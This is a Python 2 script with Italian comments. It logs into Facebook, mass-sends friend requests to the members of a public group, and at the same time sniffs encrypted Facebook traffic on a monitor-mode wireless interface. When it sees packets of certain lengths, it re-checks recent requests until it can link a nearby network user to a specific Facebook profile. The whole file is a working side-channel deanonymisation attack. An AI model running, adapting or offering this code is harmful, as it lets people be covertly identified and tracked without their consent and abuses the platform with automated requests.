#!/usr/bin/env python

import fblib
import threading
import random
import time
from scapy.all import *

#REMEMBER TO REFRESH EVERY TIME THE TOKEN!!!!!
#REMEMBER TO SET TO IGNORE YYOUR IP ADDRESS
#REMEMBER TO SET THE SNIFFING INTERFACE

#rischio falsi positivi, match multiplo se pacchetto ritrasmesso

match_found = False #if good packet found
match_checking = False #dice se sto sul thread di check

counter = 0 #per sapere a che punto della lista members siamo
thread_number = 5 # quanti sono i threads

pub_group_id = 21963195335 #id del gruppo di cui testiamo i membri (problemi con i likes)
members = fblib.get_group_member_ids(pub_group_id)

conf.iface = 'mon0' #cambiare tra tap0 e mon0



def thread_work(lock, event):

	global counter

	my_browser = fblib.login()

	while True:
		event.wait() #condizione per procedere, qui blocca l'esecuzione finche
		lock.acquire() #gestione dell'accesso alla risorsa counter
		try:
			counter = counter + 1
			print "il contatore e: " + str (counter)
		finally:
			lock.release()

		fblib.send_friend_request(my_browser, members[counter])


def thread_check(lock, event):
	"""
	questo metodo ripassa gli ultimi x id per fare un check uno per uno
	"""

	print "[+] Starting Thread_check"

	global counter
	global match_checking

	match_checking = True


	my_browser = fblib.login()

	lock.acquire()

	try:
		local_check_counter = counter - thread_number
		print "il contatore e: " + str(counter)

		# rimandiamo l'amicizia alle ultime x persone da quando ho sniffato il pacchetto
		for x in range(local_check_counter, counter + 1): #il "+1" e perche voglio sia compreso l'ultimo
			fblib.send_friend_request(my_browser, members[x])
			print "sto rimandando per il check la richiesta al n: " + str (x)

	finally:
		lock.release()
		fblib.logout(my_browser)
		event.set()
		match_checking = False

	print "[+] Ending Thread_check"


def packetHandler(pkt):

	global match_found

	if pkt.haslayer(IP):
		if pkt[IP].len == 216:
			print "Intercettato pacchetto da 216"
			match_found = True
		if pkt[IP].len == 217:
			print "Intercettato pacchetto da 217"
			match_found = True
		if pkt[IP].len == 218:
			print "Intercettato pacchetto da 218"
			match_found = True


def sniffTraffic():
	sniff(filter="tcp and src net 31.13.0.0/16 and port 443 and not host 10.200.246.235", prn = packetHandler)




def main():

	lock = threading.RLock()
	event = threading.Event()
	event.set() #appena creato impostiamo l'evento su TRUE 
	

	n = 0
	while (n < thread_number):
		r = random.randint(1,4)
		print "[+] numero casuale estratto: " + str(r)
		twork = threading.Thread(target = thread_work, args=(lock, event))
		time.sleep(r)
		twork.start()
		n = n + 1


	tsniff = threading.Thread(target = sniffTraffic)
	tsniff.start()
	

	global match_found
	global match_checking

	while True:
		if (match_found and not match_checking):

			match_found = False #reimpostiamo al valore di default
			match_checking = True
			event.clear() #metti a FALSO l'event per interrompere i tanti thread ed iniziarne uno per il check
	
			tcheck = threading.Thread(target = thread_check, args = (lock, event))
			tcheck.start()

		elif (match_found and match_checking):
			print "[+]- PERSON FOUND -[+]"

			match_found = False
			#il match_checking deve rimanere true finche c'e' il thread di check
			#uscendo, lui lo imposta a false
			


if __name__ == "__main__":
	main()
